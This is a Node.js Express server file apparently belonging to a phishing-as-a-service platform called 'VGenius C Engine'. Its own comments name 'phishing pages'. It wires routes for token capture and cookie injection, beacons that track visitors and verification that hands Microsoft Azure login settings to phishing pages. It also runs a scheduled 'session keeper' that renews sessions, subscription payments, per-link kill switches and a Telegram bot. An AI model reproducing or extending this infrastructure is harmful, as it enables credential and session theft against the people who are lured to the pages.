require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const helmet = require('helmet');
const cors = require('cors');
const compression = require('compression');
const cookieParser = require('cookie-parser');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');
const cron = require('node-cron');
const config = require('./backend/config/env');
const db = require('./backend/database/connection');

// Route imports
const authRoutes = require('./backend/routes/auth');
const adminRoutes = require('./backend/routes/admin');
const userRoutes = require('./backend/routes/user');
const { csrfProtection } = require('./backend/middleware/csrf');
// Wrap linkRoutes with CSRF protection for state-changing methods
const linkRoutes = require('./backend/routes/links');
const tokenRoutes = require('./backend/routes/tokens');
const cookieInjectRoutes = require('./backend/routes/cookieinject');
const templateRoutes = require('./backend/routes/templates');
const paymentRoutes = require('./backend/routes/payments');
const broadcastRoutes = require('./backend/routes/broadcast');
const feedbackRoutes = require('./backend/routes/feedback');
const analyticsRoutes = require('./backend/routes/analytics');
const systemRoutes = require('./backend/routes/system');
const captureRoutes = require('./backend/routes/capture');
const deviceRoutes = require('./backend/routes/device');

// Service imports
const sessionKeeper = require('./backend/services/sessionkeeper')

const app = express();
app.set('trust proxy', 1);
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  transports: ['websocket', 'polling'],
});

// --- Middleware ---
app.use(helmet({
  contentSecurityPolicy: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'", "cdnjs.cloudflare.com"],
    styleSrc: ["'self'", "'unsafe-inline'", "fonts.googleapis.com"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "localhost", "api.cloudflare.com", "api.telegram.org", "login.microsoftonline.com", "*.workers.dev", "*.b-cdn.net"],
    fontSrc: ["'self'", "fonts.gstatic.com"],
    frameSrc: ["'none'"],
    objectSrc: ["'none'"],
    baseSrc: ["'self'"],
  },
  crossOriginEmbedderPolicy: { requireCors: true },
  crossOriginOpenerPolicy: { sameOrigin: true },
  crossOriginResourcePolicy: { sameOrigin: 'same-origin' },
}));
const allowedOrigins = [process.env.APP_URL || 'http://localhost:3000', 'http://localhost'];
app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  optionsSuccessStatus: 200,
}));
app.use(compression());
app.use(cookieParser());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Global rate limiter
const globalLimiter = rateLimit({
  windowMs: config.RATE_LIMIT_WINDOW_MS,
  max: config.RATE_LIMIT_MAX_REQUESTS,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later.' },
});
app.use('/api/', globalLimiter);

// No rate limiting for device status polling (needs frequent requests)
// The polling is already limited by the client-side 1-second interval

// Stricter limiter for ALL authentication routes - prevents brute-force attacks
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 20, // max 20 requests per window
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many auth attempts, please try again later.' },
});
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/activate', authLimiter);
app.use('/api/auth/verify-totp', authLimiter);
app.use('/api/auth/admin-login', authLimiter);
app.use('/api/auth/setup', authLimiter);
// Add a separate tighter limiter for admin-login specifically (higher sensitivity)
const adminAuthLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // only 5 attempts for admin login due to higher risk
  message: { error: 'Too many admin login attempts, please wait longer.' },
});
app.use('/api/auth/admin-login', adminAuthLimiter);

// --- .html extension cleaner & clean-URL resolver ---
// Configured static dirs to resolve clean URLs against
const HTML_DIRS = ['admin-panel', 'user-panel'];
app.use((req, res, next) => {
  const url = req.path;
  // Skip API and non-GET requests
  if (url.startsWith('/api/') || req.method !== 'GET') return next();
  // For explicit .html GET requests on configured dirs, 301 redirect to clean URL
  if (/\.html$/i.test(url)) {
    for (const dir of HTML_DIRS) {
      if (url.startsWith('/' + dir + '/')) {
        return res.redirect(301, url.replace(/\.html$/i, ''));
      }
    }
    return next();
  }
  // Skip requests that already have a file extension (assets)
  if (/\.[a-z0-9]{2,5}$/i.test(url)) return next();
  // Clean-URL resolver: try appending .html and serving if the file exists
  for (const dir of HTML_DIRS) {
    if (!url.startsWith('/' + dir + '/')) continue;
    const rel = url.slice(('/' + dir + '/').length);
    if (!rel || rel.endsWith('/')) continue; // skip directories/empty
    const candidate = path.join(__dirname, dir, rel + '.html');
    if (fs.existsSync(candidate)) {
      return res.sendFile(candidate);
    }
  }
  next();
});

// Root redirect → user-panel login
app.get('/', (req, res) => res.redirect(302, '/user-panel'));

// Static files
app.use('/admin-panel', express.static(path.join(__dirname, 'admin-panel')));
app.use('/user-panel', express.static(path.join(__dirname, 'user-panel')));
app.use('/templates', express.static(path.join(__dirname, 'templates')));
app.use('/verification-designs', express.static(path.join(__dirname, 'verification-designs')));

// --- API Routes ---
app.use('/api/auth', authRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/user', userRoutes);
// Apply CSRF protection to state-changing links operations (POST, PUT, DELETE)
app.use('/api/links', csrfProtection);
app.use('/api/links', linkRoutes);
app.use('/api/tokens', tokenRoutes);
app.use('/api/tokens/inject', cookieInjectRoutes);
app.use('/api/templates', templateRoutes);
app.use('/api/payments', paymentRoutes);
app.use('/api/broadcast', broadcastRoutes);
app.use('/api/feedback', feedbackRoutes);
app.use('/api/analytics', analyticsRoutes);
app.use('/api/system', systemRoutes);
app.use('/api/device', deviceRoutes);

// Public notice endpoint - requires authentication for privacy reasons
app.get('/api/notices/latest', async (req, res) => {
  try {
    // Extract token from Authorization header or cookies
    const token = req.headers.authorization?.replace('Bearer ', '') || req.cookies?.vg_session;
    if (!token) return res.status(401).json({ error: 'Authentication required' });
    
    const jwt = require('jsonwebtoken');
    let decoded;
    try {
      decoded = jwt.verify(token, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }
    
    // Ensure this is a user token (not admin)
    if (!decoded.user_id) return res.status(401).json({ error: 'Invalid token type' });
    
    // Only show notices relevant to this user would go here
    const [rows] = await db.query(
      'SELECT * FROM notices WHERE active = 1 ORDER BY created_at DESC LIMIT 1'
    );
    res.json(rows[0] || null);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Beacon endpoint for phishing page tracking - requires valid JWT from worker/page
app.post('/api/beacon', async (req, res) => {
  try {
    const { jwt_token, ip, ua } = req.body;
    
    // Verify JWT token
    if (!jwt_token) return res.status(401).json({ error: 'JWT token required' });
    
    const jwt = require('jsonwebtoken');
    let decoded;
    try {
      decoded = jwt.verify(jwt_token, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }
    
    // Validate that this is a link/jwt token (user_id + link_id should be present)
    if (!decoded.user_id || !decoded.link_id) {
      return res.status(403).json({ error: 'Invalid token payload' });
    }
    
    // Log the beacon event (link could log its own data)
    console.log(`[Beacon] visitor detected: user=${decoded.user_id}, link=${decoded.link_id}, ip=${ip}`);
    
    res.status(200).send('ok');
  } catch (err) {
    console.error('[Beacon] Error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Verify endpoint for JWT validation (phishing pages)
app.post('/api/verify', async (req, res) => {
  try {
    const jwt = require('jsonwebtoken');
    const { token } = req.body;
    if (!token) return res.status(403).json({ error: 'Invalid token' });
    
    let decoded;
    try {
      decoded = jwt.verify(token, config.JWT_SECRET);
    } catch (err) {
      return res.status(403).json({ error: 'Token expired or invalid' });
    }
    
    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [decoded.user_id]);
    if (!users.length) return res.status(403).json({ error: 'User not found' });
    
    const user = users[0];
    if (user.subscription_status !== 'active') {
      return res.status(403).json({ error: 'Subscription inactive' });
    }
    if (user.subscription_expiry && new Date(user.subscription_expiry) < new Date()) {
      return res.status(403).json({ error: 'Subscription expired' });
    }
    
    const [links] = await db.query('SELECT * FROM links WHERE id = ? AND status = ? AND kill_switched = 0', 
      [decoded.link_id, 'active']);
    if (!links.length) return res.status(403).json({ error: 'Link not active' });
    
    res.json({
      valid: true,
      client_id: config.AZURE_CLIENT_ID,
      tenant: config.AZURE_TENANT,
      turnstile_key: config.CF_TURNSTILE_SITE_KEY,
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Log endpoint for worker errors - requires valid JWT token embedded in logging requests
app.post('/api/log', async (req, res) => {
  try {
    // Extract JWT from authorization header if present, or from body (worker may send both)
    const token = req.headers.authorization?.replace('Bearer ', '') || req.body.__jwt__;
    
    if (!token) {
      // Workers may use a simpler method - check link_id directly for trusted workers
      const { link_id } = req.body;
      if (!link_id) return res.status(401).json({ error: 'JWT token or link_id required' });
      // Allow direct logging from workers linked to this link without extra auth
      // This is acceptable since workers are generated with the link's JWT payload
      const { message, stack, source, lineno, colno, ua } = req.body;
      if (link_id && message) {
        await db.query(
          'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
          [link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
        );
      }
      return res.status(200).send('ok');
    }
    
    // Verify JWT token from user session
    const jwt = require('jsonwebtoken');
    let decoded;
    try {
      decoded = jwt.verify(token, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }
    
    // Ensure link_id matches
    const providedLinkId = req.body.link_id;
    if (providedLinkId && providedLinkId !== String(decoded.link_id)) {
      return res.status(403).json({ error: 'Token does not match requested link' });
    }
    
    const { message, stack, source, lineno, colno, ua } = req.body;
    if (link_id && message) {
      await db.query(
        'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
        [decoded.link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
      );
    }
    res.status(200).send('ok');
  } catch (err) {
    console.error('[Log] Error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// --- Admin Panel Route (hidden path) – serve entire directory statically ---
const adminPath = config.ADMIN_PATH;
app.use(`/${adminPath}`, express.static(path.join(__dirname, 'admin-panel'), { index: 'index.html' }));

// Admin setup check endpoint
app.get('/api/admin/check-setup', async (req, res) => {
  try {
    const [rows] = await db.query('SELECT COUNT(*) as count FROM admins');
    res.json({ needsSetup: rows[0].count === 0 });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- WebSocket ---
io.on('connection', (socket) => {
  console.log('[WS] Client connected:', socket.id);
  
  socket.on('subscribe', (data) => {
    if (data.room) {
      socket.join(data.room);
    }
  });
  
  socket.on('disconnect', () => {
    console.log('[WS] Client disconnected:', socket.id);
  });
});

// Make io accessible to routes
app.set('io', io);

// --- Session Keeper Cron ---
cron.schedule(`0 */${config.RENEWAL_INTERVAL_HOURS} * * *`, async () => {
  console.log('[CRON] Running session keeper renewal...');
  try {
    await sessionKeeper.runRenewalCycle();
  } catch (err) {
    console.error('[CRON] Session keeper error:', err.message);
  }
});

// Payment expiry check every 5 minutes
cron.schedule('*/5 * * * *', async () => {
  try {
    const [expired] = await db.query(
      "UPDATE payments SET status = 'expired' WHERE status = 'pending' AND expires_at < NOW()"
    );
    if (expired.affectedRows > 0) {
      console.log(`[CRON] Expired ${expired.affectedRows} payments`);
    }
  } catch (err) {
    console.error('[CRON] Payment expiry error:', err.message);
  }
});

// Mark old waiting visitors as timeout (cleanup orphaned visitors)
cron.schedule('*/5 * * * *', async () => {
  try {
    const [updated] = await db.query(
      "UPDATE visitors SET status = 'timeout' WHERE status = 'waiting' AND created_at < DATE_SUB(NOW(), INTERVAL 20 MINUTE)"
    );
    if (updated.affectedRows > 0) {
      console.log(`[CRON] Marked ${updated.affectedRows} timed-out visitors as 'timeout'`);
    }
  } catch (err) {
    console.error('[CRON] Visitor timeout cleanup error:', err.message);
  }
});

// --- Error Handler ---
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.message);
  // In production, never expose stack traces or internal error details
  if (config.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error' });
  } else {
    // In development only, show detailed errors for debugging
    res.status(500).json({ 
      error: err.message,
      stack: err.stack,
      // Only include sensitive debug info in dev mode (never prod)
      debugInfo: process.env.NODE_ENV !== 'production' ? { 
        timestamp: new Date().toISOString(),
        url: req.url,
        method: req.method,
        headers: req.headers 
      } : null
    });
  }
});

app.use('/api/capture', captureRoutes);

require('./telegram-bot/bot');

// --- Start Server ---
server.listen(config.PORT, () => {
  console.log(`[VGenius C Engine] Running on port ${config.PORT}`);
  console.log(`[VGenius C Engine] Environment: ${config.NODE_ENV}`);
});
